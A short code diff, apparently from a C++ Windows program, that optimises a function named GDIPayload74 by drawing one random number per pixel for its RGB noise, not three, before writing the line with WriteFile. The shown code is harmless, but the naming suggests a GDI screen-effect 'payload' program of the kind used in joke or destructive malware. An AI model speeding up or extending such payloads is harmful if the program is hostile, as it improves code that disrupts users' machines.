@@ -2323,12 +2323,15 @@ DWORD WINAPI GDIPayload74(LPVOID)
         {
             for (int x = 0; x < bw; ++x)
             {
+                // Bolt optimization: Extract RGB components from a single FXRand call.
+                // Reduces per-pixel RNG calls from 3 to 1.
+                uint32_t rnd = FXRand(ns);
                 line[(size_t)x * 3 + 0] =
-                    (uint8_t)(FXRand(ns) & 255);
+                    (uint8_t)(rnd & 255);
                 line[(size_t)x * 3 + 1] =
-                    (uint8_t)(FXRand(ns) & 255);
+                    (uint8_t)((rnd >> 8) & 255);
                 line[(size_t)x * 3 + 2] =
-                    (uint8_t)(FXRand(ns) & 255);
+                    (uint8_t)((rnd >> 16) & 255);
             }
 
             WriteFile(
